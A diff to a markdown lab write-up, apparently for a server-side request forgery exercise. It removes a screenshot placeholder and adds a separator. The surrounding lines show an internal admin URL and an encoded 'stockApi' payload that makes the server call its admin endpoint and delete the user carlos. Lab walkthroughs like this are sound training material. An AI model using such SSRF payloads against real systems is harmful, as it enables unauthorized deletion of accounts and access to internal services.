@@ -374,11 +374,6 @@ Sort by **Status**:
 
 This means **this IP hosts the admin panel**.
 
-### 🖼 Evidence Screenshot #1 (Found Admin IP)
-```
-[ Insert screenshot showing the 200 OK IP discovered during Intruder scan ]
-```
-
 Example discovered target:
 ```
 http://192.168.0.57:8080/admin
@@ -416,6 +411,8 @@ stockApi=http://192.168.0.57:8080/admin/delete%3Fusername%3Dcarlos
 ```
 
 Send → user **carlos deleted** → **Lab solved**.
+
+---
 
 ### 🖼 Evidence Screenshot #2 (Encoded Delete Payload)
 
